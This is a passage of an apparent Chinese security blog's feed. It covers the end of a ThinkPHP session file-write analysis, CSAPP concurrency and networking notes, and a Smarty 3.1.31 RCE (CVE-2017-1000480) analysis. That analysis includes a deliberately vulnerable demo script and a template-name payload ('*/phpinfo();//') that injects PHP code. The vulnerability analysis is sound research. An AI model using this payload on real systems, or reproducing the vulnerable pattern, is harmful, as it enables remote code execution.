src/think/session/Store.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 保存session数据</span></span><br><span class="line"><span class="comment">* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line">    $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// data 为空就进行删除</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>$this-&gt;handler-&gt;write($sessionId, $data);</code> 的具体实现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// session/driver/File.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(string $sessID, string $sessData)</span>: <span class="title">bool</span> </span>&#123;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getFileName($sessID, <span class="keyword">true</span>);</span><br><span class="line">    $data     = $sessData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile($filename, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里就落实到 file_put_contents() 了</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span><span class="params">($path, $content)</span>: <span class="title">bool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (bool) file_put_contents($path, $content, LOCK_EX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说还是比较鸡肋，需要能控制 session，直接打不了。</p><p>所以要与具体的业务结合，寻找 session 的输入点，比如某些系统将用户名直接存入 session 中。</p><p>另外，那个删除点就更难控制了，那也是 TP 清除 session 的正常功能，所以能删的文件必须以 <code>sess_</code> 开头。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw</a></p><p><a href="https://mochazz.github.io/2020/01/14/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/14/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;2020 年 1 月 10 日，ThinkPHP 团队发布一个补丁更新，修复了一处由不安全的 SessionId 导致的任意文件操作漏洞。&lt;
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://wywwzjj.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 并发编程 笔记</title>
    <link href="https://wywwzjj.top/2019/12/16/CSAPP-Chapter-12-Notes/"/>
    <id>https://wywwzjj.top/2019/12/16/CSAPP-Chapter-12-Notes/</id>
    <published>2019-12-16T12:47:57.000Z</published>
    <updated>2020-02-01T01:29:09.525Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于进程的并发"><a href="#基于进程的并发" class="headerlink" title="基于进程的并发"></a>基于进程的并发</h2><p>基于进程的并发服务器</p><p>进程的优劣</p><h2 id="基于-I-O-多路复用的并发"><a href="#基于-I-O-多路复用的并发" class="headerlink" title="基于 I/O 多路复用的并发"></a>基于 I/O 多路复用的并发</h2><p>基于 I/O 多路复用的并发事件驱动服务器</p><p>I/O 多路复用技术的优劣</p><h2 id="基于线程的并发"><a href="#基于线程的并发" class="headerlink" title="基于线程的并发"></a>基于线程的并发</h2><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><ul><li>用户线程</li><li>内核线程</li><li>轻量级进程：内核中实现，支持用户线程（Solaris）</li></ul><p>管理、控制线程的模块称作线程包。</p><p>线程模型中，由一个线程作为协调者来分派任务，而其他线程负责处理任务的模型称作分派/工作模型。</p><p>各线程相互独立，每个线程可单独完成任务的接收、处理、结果返回的模型称作队列模型。</p><p>进程 = 资源 + 指令执行序列</p><p>是否可以资源不动而切换指令序列？可！只切PC！保留了并发的优点，避免了进程切换的代价。从而引入线程。</p><p>线程切换：TCB 与栈互相配合。</p><p>yield，next，突然想起了py的协程</p><h3 id="与进程的区别"><a href="#与进程的区别" class="headerlink" title="与进程的区别"></a>与进程的区别</h3><p>线程：处理器分配调度的基本单位，进程内资源所有线程共享，线程切换开销小</p><p>进程：其他资源（除处理器外）分配的基本单位，进程切换开销大</p><p>进程可以创建线程、子进程，线程只能创建线程。</p><p>线程执行模型</p><p>POSIX 线程</p><p>创建线程</p><p>终止线程</p><p>回收已终止线程的资源</p><p>分离线程</p><p>初始化线程</p><p>基于线程的并发服务器</p><h2 id="多线程程序中的共享变量"><a href="#多线程程序中的共享变量" class="headerlink" title="多线程程序中的共享变量"></a>多线程程序中的共享变量</h2><p>线程内存模型</p><p>将变量映射到内存</p><p>共享变量</p><h2 id="用信号量同步线程"><a href="#用信号量同步线程" class="headerlink" title="用信号量同步线程"></a>用信号量同步线程</h2><h3 id="进度图"><a href="#进度图" class="headerlink" title="进度图"></a>进度图</h3><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>用户进程可以通过使用操作系统提供的<strong>一对原语</strong>来对<strong>信号量</strong>进行操作。</p><p>信号在进程间通信、同步起到了重要的作用，但信号表示的含义有限，信号 =&gt; 信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> value;</span><br><span class="line">    PCB* <span class="built_in">queue</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">P(semaphore s) &#123;</span><br><span class="line">    s.value--;</span><br><span class="line">    <span class="keyword">if</span> (s.value &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(s.<span class="built_in">queue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">V(semaphore s) &#123;？</span><br><span class="line">    s.value++;</span><br><span class="line">    <span class="keyword">if</span> (s.value &lt;= <span class="number">0</span>) &#123;  <span class="comment">// &lt;= 0，暂无资源还去唤醒？</span></span><br><span class="line">        wakeup(s.<span class="built_in">queue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>P 消费资源。来自荷兰语的 problem，即 test。</p></li><li><p>V 生产资源。来自荷兰语 verhogen，即 increment。</p></li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><h5 id="信号量的双用途"><a href="#信号量的双用途" class="headerlink" title="信号量的双用途"></a>信号量的双用途</h5><ul><li>互斥和条件同步</li><li>但等待条件是独立的互斥</li></ul><h5 id="容易出错"><a href="#容易出错" class="headerlink" title="容易出错"></a>容易出错</h5><ul><li>使用的信号量已经被另一个线程占用</li><li>忘记释放信号量</li></ul><h5 id="不能够处理死锁问题"><a href="#不能够处理死锁问题" class="headerlink" title="不能够处理死锁问题"></a>不能够处理死锁问题</h5><h4 id="互斥"><a href="#互斥" class="headerlink" title="互斥"></a>互斥</h4><p>mutex = 1</p><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p>xxx = 0</p><h4 id="前驱"><a href="#前驱" class="headerlink" title="前驱"></a>前驱</h4><p>每一个前置都能看成一个同步关系</p><p>信号量</p><p>使用信号量实现互斥</p><p>利用信号量来调度共享资源</p><p>综合：基于预线程化的并发服务器</p><h2 id="使用线程提供并行性"><a href="#使用线程提供并行性" class="headerlink" title="使用线程提供并行性"></a>使用线程提供并行性</h2><h2 id="其他线程并发问题"><a href="#其他线程并发问题" class="headerlink" title="其他线程并发问题"></a>其他线程并发问题</h2><p>线程安全</p><p>可重入性</p><p>在线程化的程序中使用已存在的库函数</p><p>竞争</p><p>死锁</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基于进程的并发&quot;&gt;&lt;a href=&quot;#基于进程的并发&quot; class=&quot;headerlink&quot; title=&quot;基于进程的并发&quot;&gt;&lt;/a&gt;基于进程的并发&lt;/h2&gt;&lt;p&gt;基于进程的并发服务器&lt;/p&gt;
&lt;p&gt;进程的优劣&lt;/p&gt;
&lt;h2 id=&quot;基于-I-O-多路复用的并发
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>smarty 3.1.31 RCE</title>
    <link href="https://wywwzjj.top/2019/12/15/smarty-3.1.31-RCE/"/>
    <id>https://wywwzjj.top/2019/12/15/smarty-3.1.31-RCE/</id>
    <published>2019-12-15T15:00:26.000Z</published>
    <updated>2020-02-01T12:49:38.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>smarty 模板的使用比较简单，主要有两个核心函数。一个是 <code>assign()</code>，把模板中要使用的数据进行欲赋值，一个是 <code>display()</code>，用来解析和展示最后的视图模板。</p><p>CVE 描述信息：</p><blockquote><p>Smarty 3 before 3.1.32 is vulnerable to a PHP code injection when calling fetch() or display() functions on custom resources that does not sanitize template name.</p></blockquote><p>信息的源头，更新日志：<a href="https://github.com/smarty-php/smarty/blob/master/change_log.txt" target="_blank" rel="noopener">https://github.com/smarty-php/smarty/blob/master/change_log.txt</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21.7.2017</span><br><span class="line">  - security possible PHP code injection on custom resources at display() <span class="keyword">or</span> fetch()</span><br><span class="line">    calls <span class="keyword">if</span> the<span class="built_in"> resource </span>does <span class="keyword">not</span> sanitize the template name</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>可以把项目 clone 下来，再切到 <strong>v3.1.31</strong>。我这里是用 composer 创的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout tags/v3.1.31 -b v3.1.21-debug</span><br></pre></td></tr></table></figure><p>Insomni’hack teaser 2018 拿这个点出了个题 <a href="https://ctftime.org/task/5185" target="_blank" rel="noopener">Smart-Y</a>，这有 wp <a href="https://ctftime.org/writeup/8552。" target="_blank" rel="noopener">https://ctftime.org/writeup/8552。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// load Smarty library</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">news</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($name, &amp;$source, &amp;$mtime)</span> </span>&#123;</span><br><span class="line">        $template = <span class="string">"CVE-2017-1000480 smarty PHP code injection"</span>;</span><br><span class="line">        $source = $template;</span><br><span class="line">        $mtime = time();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Smarty configuration</span></span><br><span class="line">$smarty = <span class="keyword">new</span> Smarty();</span><br><span class="line">$my_security_policy = <span class="keyword">new</span> Smarty_Security($smarty);</span><br><span class="line">$my_security_policy-&gt;php_functions = <span class="keyword">NULL</span>;</span><br><span class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</span><br><span class="line">$my_security_policy-&gt;modifiers = <span class="keyword">array</span>();</span><br><span class="line">$smarty-&gt;enableSecurity($my_security_policy);</span><br><span class="line">$smarty-&gt;setCacheDir(<span class="string">'cache'</span>);</span><br><span class="line">$smarty-&gt;setCompileDir(<span class="string">'compile'</span>);</span><br><span class="line"></span><br><span class="line">$smarty-&gt;registerResource(<span class="string">'news'</span>, <span class="keyword">new</span> news);</span><br><span class="line">$smarty-&gt;display(<span class="string">'news:'</span> . $_GET[<span class="string">'j'</span>]);</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb594lta6rj213g08rjsc.jpg" alt="image.png"></p><p>注释符还可以用 <code>*/phpinfo();/*</code>，但 Windows 下文件名不能含有 <code>\/:*?&quot;&lt;&gt;|</code>，所以 <code>//</code> 更通用。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgwcnjy0vj20k70cgwp0.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看下官方给的补丁。</p><p><a href="https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61" target="_blank" rel="noopener">https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgwyts9ctj20rf0l5q4u.jpg" alt="image.png"></p><p>PoC 生成的临时文件如下。如果没有 PoC，那就随便输一点内容测试一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Smarty version 3.1.31, created on 2020-02-01 14:42:38</span></span><br><span class="line"><span class="comment">  from "news:*/</span>phpinfo();<span class="comment">//" */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> Smarty_Internal_Template $_smarty_tpl */</span></span><br><span class="line">  <span class="string">'has_nocache_code'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">  <span class="string">'file_dependency'</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'1f7fa551e77a29c48c7ac4143a2b811ca7e38ce5'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt; <span class="string">'news:*/phpinfo();//'</span>,</span><br><span class="line">      <span class="number">1</span> =&gt; <span class="number">1580539358</span>,</span><br><span class="line">      <span class="number">2</span> =&gt; <span class="string">'news'</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-1000480</span> smarty PHP code injection<span class="meta">&lt;?php</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合上面的内容来看，模板显然是从这里产生的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$output = <span class="string">"&lt;?php\n"</span>;</span><br><span class="line">$output .= <span class="string">"/* Smarty version "</span> . Smarty::SMARTY_VERSION . <span class="string">", created on "</span> . strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>) .</span><br><span class="line">    <span class="string">"\n  from \""</span> . $_template-&gt;source-&gt;filepath . <span class="string">"\" */\n\n"</span>;</span><br><span class="line">$output .= <span class="string">"/* @var Smarty_Internal_Template \$_smarty_tpl */\n"</span>;</span><br></pre></td></tr></table></figure><p>$_template-&gt;source-&gt;filepath 这个变量的内容一旦把前面的注释符闭合，就能插入 PHP 代码。</p><p>所以官方打的补丁也是针对这些输出点进行过滤。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文档地址：<a href="https://www.smarty.net/docs/zh_CN/" target="_blank" rel="noopener">https://www.smarty.net/docs/zh_CN/</a></p><p>暂时没想到利用场景，后期有缘遇到再继续深入吧。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞分析/" target="_blank" rel="noopener">https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;smarty 模板的使用比较简单，主要有两个核心函数。一个是 &lt;code&gt;assign()&lt;/code&gt;，把模板中要使用的数据进行欲赋值，一
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="smarty" scheme="https://wywwzjj.top/tags/smarty/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 网络编程 笔记</title>
    <link href="https://wywwzjj.top/2019/12/02/CSAPP-Chapter-11-Notes/"/>
    <id>https://wywwzjj.top/2019/12/02/CSAPP-Chapter-11-Notes/</id>
    <published>2019-12-02T13:27:57.000Z</published>
    <updated>2020-02-01T08:24:13.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实践项目"><a href="#实践项目" class="headerlink" title="实践项目"></a>实践项目</h2><p>实现一个 telnet 版本的聊天服务器，主要有以下需求。</p><ul><li>每个客户端可以用使用 <code>telnet ip:port</code> 的方式连接到服务器上。</li><li>新连接需要用用户名和密码登录，如果没有，则需要注册一个。</li><li>然后可以选择一个聊天室加入聊天。</li><li>管理员有权创建或删除聊天室，普通人员只有加入、退出、查询聊天室的权力。</li><li>聊天室需要有人数限制，每个人发出来的话，其它所有的人都要能看得到。</li></ul><p>实现一个简单的 HTTP 服务器，主要有以下需求。</p><ul><li>解释浏览器传来的 HTTP 协议，只需要处理 URL path。</li><li>然后把所代理的目录列出来。</li><li>在浏览器上可以浏览目录里的文件和下级目录。</li><li>如果点击文件，则把文件打开传给浏览器（浏览器能够自动显示图片、PDF，或 HTML、CSS、JavaScript 以及文本文件）。</li><li>如果点击子目录，则进入到子目录中，并把子目录中的文件列出来。</li></ul><p>实现一个生产者 / 消费者消息队列服务，主要有以下需求。</p><ul><li>消息队列采用一个 Ring-buffer 的数据结构。</li><li>可以有多个 topic 供生产者写入消息及消费者取出消息。</li><li>需要支持多个生产者并发写。</li><li>需要支持多个消费者消费消息（只要有一个消费者成功处理消息就可以删除消息）。</li><li>消息队列要做到不丢数据（要把消息持久化下来）。</li><li>能做到性能很高。</li></ul><p>v2ray 文档 <a href="https://www.v2ray.com/developer/intro/roadmap.html" target="_blank" rel="noopener">https://www.v2ray.com/developer/intro/roadmap.html</a></p><p>自己实现一个 socks5</p><p>Python： <a href="https://hatboy.github.io/2018/04/28/Python编写socks5服务器" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/28/Python%E7%BC%96%E5%86%99socks5%E6%9C%8D%E5%8A%A1%E5%99%A8</a></p><p>C：<a href="https://www.cayun.me/网络/用c语言写一个socks5代理服务器/" target="_blank" rel="noopener">https://www.cayun.me/%E7%BD%91%E7%BB%9C/%E7%94%A8c%E8%AF%AD%E8%A8%80%E5%86%99%E4%B8%80%E4%B8%AAsocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/</a> </p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>早起 TCP/IP 被移植到 UNIX 平台时，设计者们希望像访问文件一样去访问网络。</p><p>Linux 提供了三种类型套接口：</p><ul><li>流式套接口（SOCK_STREAM）</li></ul><p>提供了可靠的双向顺序数据流连接。</p><ul><li>数据报套接口（SOCK_DGRAM）</li></ul><p>提供双向的数据传输。</p><ul><li>原始套接口（SOCK_RAW）</li></ul><p>这种套接口允许进程直接存取下层的协议。</p><p><strong>现在全世界的人都在解决 C10K 问题。</strong></p><p><a href="http://www.kegel.com/c10k.html" target="_blank" rel="noopener">http://www.kegel.com/c10k.html</a></p><p>翻译版：<a href="https://www.oschina.net/translate/c10k" target="_blank" rel="noopener">https://www.oschina.net/translate/c10k</a></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>TCP 与 UDP 的异同？</p><p>  面向连接的可靠传输，有重传机制，还有流量控制、拥塞控制</p><p>  面向无连接的不可靠传输，以带数据边界的数据报形式传送，速度快</p></li><li><p>TCP 连接的特点和基本流程，何谓“三次握手”？</p><p>  A = seq1 =&gt; B</p><p>  B = seq1 + 1 / seq2=&gt; A</p><p>  A = seq2 + 1 =&gt; B</p></li><li><p>简述 OSI 七层模型和 TCP/IP 模型的异同</p><p>  OSI  参考模型只是一个抽象的理论模型，TCP/IP 是实际网络应用中的经验产物，它与 OSI 的四层相关联。</p></li><li><p>二倍 msl（maximum segment lifetime） 作用？</p><p>  结合四次挥手可以很清晰的看到：</p><ul><li>可靠的实现 TCP 全双工连接的终止（保证最后一次 ack 到达）</li><li>允许老的重复报文在网络中的消逝（旧报文到达导致重复建立连接）</li></ul></li><li><p>简述 C/S 的运行模型。</p><p>  即客户端与服务端运行模型，服务端为客户端提供服务，一直等待客户请求；</p><p>  客户端向服务端发出请求，并等待响应结果。</p></li></ul><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><ul><li><p>listen 监听列表满了怎么办？</p><p>  TCP 将忽略客户传来的 SYN 分节，不发送 RST，客户端将重发 SYN。</p></li><li><p>在调用 select 函数时，如何使得进程跳出阻塞状态？</p><p>  设置信号处理函数、直接指定时间？</p></li><li><p>shutdown、close 区别？</p><p>  close：将套接口描述字引用计数器减一，计数器为零套接口才会关闭，并且终止了读写两个方向。</p><p>  shutdown：不管引用计数器为何值，直接终止网络连接，可单独指定终止读、写。</p></li><li><p>网络编程时，为什么要考虑字节顺序问题？</p><p>  因为网络字节序与主机字节序不一致。</p></li><li><p>编程实现：TCP，客户机产生两个随机数，发给两个服务器，A将两数相加，B相减，分别将结果返给客户机。</p></li><li><p>简述 socket API 的差别：</p><p>  send、write、writev、sendto、sendmsg</p></li><li><p>什么是多路复用 select，给出一个典型应用</p><p>  内核发现进程指定的一个或多个I/O条件就绪，就通知进程。典型：多个描述字多路复用，比如交互式输入和网络套接字。</p></li><li><p>出现粘包如何处理？</p></li></ul><h2 id="UDP与原始套接口"><a href="#UDP与原始套接口" class="headerlink" title="UDP与原始套接口"></a>UDP与原始套接口</h2><ul><li><p>UDP协议中发送数据大于缓冲区大小，系统如何处理，说明理由。</p><blockquote><p>UDP将直接丢弃这个数据报，并且不发送任何报错信息。</p></blockquote></li><li><p>UDP协议与TCP协议的服务器在处理客户端请求时有何异同？</p><p>  UDP采用循环服务器的工作方式，它仅有的单个套接口用于接收所有到达的数据报，并发回所有的响应，UDP套接口有一个接收缓冲区用于存放到来的数据报。</p></li><li><p>与 TCP 中的 connect 有何差别？</p><p>  UDP 不需要建立连接，使用 connect 只是记录目的方的IP与端口，调用后，可直接 <code>read</code>、<code>write</code>。</p><p>  而且这里的 read 将不会受到来自其他主机的应答。</p></li><li><p>如何避免UDP协议下客户端将非服务端发送的应答，误认为是服务器应答?</p><ul><li>通过 recvfrom 里返回的 IP 与端口区分</li><li>使用 connect</li></ul></li><li><p>简述ping程序的功能与实现原理。</p><p>  利用原始套接口发送 icmp 回射请求，等待对方的应答，应答中包含请求的标识符、序列号、时间戳</p></li><li><p>简述traceroute程序的功能与实现原理。</p><p>  首先发送 ttl 为1的 udp 数据报，然后逐次递增ttl，确定下一跳的路由。</p><p>  当 icmp 报文到达目标主机时，目标主机返送一个 icmp 错误，显示端口不可达。</p></li></ul><h2 id="带外数据"><a href="#带外数据" class="headerlink" title="带外数据"></a>带外数据</h2><ul><li><p>什么是带外数据？TCP 协议支持多少个字节的带外数据？</p><blockquote><p>若连接的某端发生了重要的事情，希望迅速通知对端，这种通知要在发送缓存数据前发送。</p><p>带外数据并不要求在客户与服务器间再使用一个连接，而是映射到已有的连接中。</p><p>只支持一个字节</p></blockquote></li><li><p>试给出一个使用带外数据提供的服务。</p><blockquote><p>心搏函数。</p></blockquote></li><li><p>TCP 有没有为紧急数据提供单独的数据信道，它是如何实现带外数据传输的？</p><blockquote><p>TCP 没有单独的通道，而是使用的紧急模式实现的。</p></blockquote></li><li><p>TCP 发送和接收带外数据有哪些方法？</p><ul><li><code>send(sockfd, &#39;A&#39;, 1, MSG_OOB)</code></li></ul></li><li><p>SIGURG 信号处理函数</p><ul><li>select 异常集合接收</li><li>带外标志读取</li></ul></li><li><p>TCP 协议收到一个新的紧急指针时，将通知接收进程，有哪些通知方法？</p><p>  SIGURG 信号、select</p></li><li><p>如果进程设置了 SO_OOBINLINE 选项，能否通过设置 MSG_OOB 标志来读取带外数据？为什么？应该采用什么方式读取带外数据？</p><p>  不能，SO_OOBINLINE 选项表示将紧急数据留到普通的套接口缓冲区，所以正常的 read 就行了。</p><p>  可通过 sockatmark 读取带外标识位置。</p></li></ul><h2 id="阻塞与非阻塞"><a href="#阻塞与非阻塞" class="headerlink" title="阻塞与非阻塞"></a>阻塞与非阻塞</h2><h3 id="为什么会阻塞？"><a href="#为什么会阻塞？" class="headerlink" title="为什么会阻塞？"></a>为什么会阻塞？</h3><p>两个缓冲区：内核缓冲区、进程缓冲区，当内核缓冲区未满足时，该进程将被投入休眠。</p><h3 id="什么是非阻塞？"><a href="#什么是非阻塞？" class="headerlink" title="什么是非阻塞？"></a>什么是非阻塞？</h3><blockquote><p>将一个套接口设为非阻塞 =&gt; 通知内核，当所请求的 I/O 操作未满足时，不要阻塞该进程，而是返回一个错误</p></blockquote><p>优点：当 I/O 操作不能立即完成时，进程还可以继续后续的操作，提高自身运行效率。</p><p>缺点：进程一直处于运行状态，可能占用大量CPU时间，影响其他进程的运行效率。</p><h3 id="非阻塞"><a href="#非阻塞" class="headerlink" 